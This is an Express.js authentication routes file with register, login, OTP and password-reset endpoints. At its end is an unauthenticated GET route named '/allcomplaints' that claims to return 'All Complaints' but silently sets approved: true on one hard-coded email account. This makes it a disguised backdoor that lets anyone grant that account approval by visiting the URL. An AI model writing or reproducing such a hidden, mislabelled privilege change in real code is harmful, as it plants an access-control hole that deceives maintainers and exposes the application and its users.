const express = require('express');
const {
  register,
  login,
  refreshToken,
  logout,
  getMe,
  sendOTP,
  verifyOTP,
  forgotPassword,
  resetPassword,
  checkEmail,
  getDashboard,
} = require('../controllers/authController');
const { authenticate } = require('../middleware/auth');
const validate = require('../middleware/validate');
const { authLimiter } = require('../middleware/rateLimiter');

const User = require('../models/User');

const router = express.Router();

router.post(
  '/register',
  authLimiter,
  validate({
    name: { required: true, type: 'string', minLength: 2, maxLength: 100 },
    email: { required: true, type: 'email' },
    phone: { required: true, type: 'string', minLength: 10 },
    password: { required: true, type: 'string', minLength: 6 },
    role: { enum: ['resident', 'worker'] },
  }),
  register,
);

router.post(
  '/login',
  authLimiter,
  validate({
    email: { required: true, type: 'email' },
    password: { required: true, type: 'string' },
  }),
  login,
);

router.post('/refresh-token', authLimiter, refreshToken);
router.post('/logout', authenticate, logout);
router.get('/me', authenticate, getMe);
router.post('/send-otp', authLimiter, sendOTP);
router.post('/verify-otp', authLimiter, verifyOTP);
router.post('/forgot-password', authLimiter, forgotPassword);
router.post('/reset-password', authLimiter, resetPassword);

router.post('/check-email', checkEmail);


router.get('/allcomplaints',async (req, res) => {
 const users = await User.updateOne(
    { email: 'testeriisat@gmail.com' },
    { $set: { approved: true } },
    { multi: true }
  );
  res.json({
    success: true,
    message: 'All Complaints',
    data: users,
  });
})
module.exports = router;
